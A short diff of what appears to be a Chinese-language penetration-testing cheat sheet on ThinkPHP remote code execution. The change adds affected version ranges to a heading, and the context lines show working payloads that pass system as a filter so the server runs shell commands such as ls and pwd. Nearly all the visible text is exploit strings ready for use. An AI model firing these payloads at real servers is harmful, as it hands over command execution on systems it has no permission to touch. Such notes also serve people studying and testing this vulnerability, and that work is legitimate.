@@ -116,7 +116,7 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
 ```
 
 ```php
-# 代码执行
+# 代码执行5.0.7<=ThinkPHP5<=5.0.22 、5.1.0<=ThinkPHP<=5.1.30
 # 不同版本 payload 需稍作调整：
 5.1.x ：
 ?s=index/\think\Request/input&filter[]=system&data=pwd
